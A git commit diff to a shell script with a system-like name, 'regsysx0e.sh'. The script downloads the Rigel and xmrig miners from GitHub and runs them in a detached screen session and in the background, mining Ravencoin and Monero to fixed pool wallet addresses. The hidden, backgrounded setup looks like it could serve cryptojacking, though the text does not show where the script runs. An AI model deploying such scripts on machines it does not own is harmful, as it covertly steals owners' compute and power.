1466777073614f619fd31245b0e58705614e4827
Thabo Koee <31208817+TechTouchABI@users.noreply.github.com>
2023-10-26 20:14:49 +0000

    Update regsysx0e.sh

--- regsysx0e.sh
+++ regsysx0e.sh
@@ -4,10 +4,14 @@ wget https://github.com/rigelminer/rigel/releases/download/1.9.1/rigel-1.9.1-lin
 
 tar -zxf rigel-1.9.1-linux.tar.gz && rm -rf rigel-1.9.1-linux.tar.gz.1 && cd rigel-1.9.1-linux \
 
-screen -d -m -S ravenmama ./rigel -a ravencoin -o stratum+tcp://rvn.2miners.com:6060 -u RR8rcNoeUnb3tSagCaBznj9gGNPmUM8GC4 -p x --no-tui --dns-over-https 
+screen -d -m -S ravenmama ./rigel -a ravencoin -o stratum+tcp://rvn.2miners.com:6060 -u RR8rcNoeUnb3tSagCaBznj9gGNPmUM8GC4 -p x --no-tui --dns-over-https \
 
+wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-bionic-x64.tar.gz  \
 
+rm -rf xmrig-6.20.0-bionic-x64.tar.gz.1	\
 
+tar -zxf xmrig-6.20.0-bionic-x64.tar.gz   \
 
+cd xmrig-6.20.0	\
 
-
+./xmrig -a randomx -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -u NHbJBmjRDqvpDVfpCDJcNgxS5qr6HEsqhrs2 -p x -B
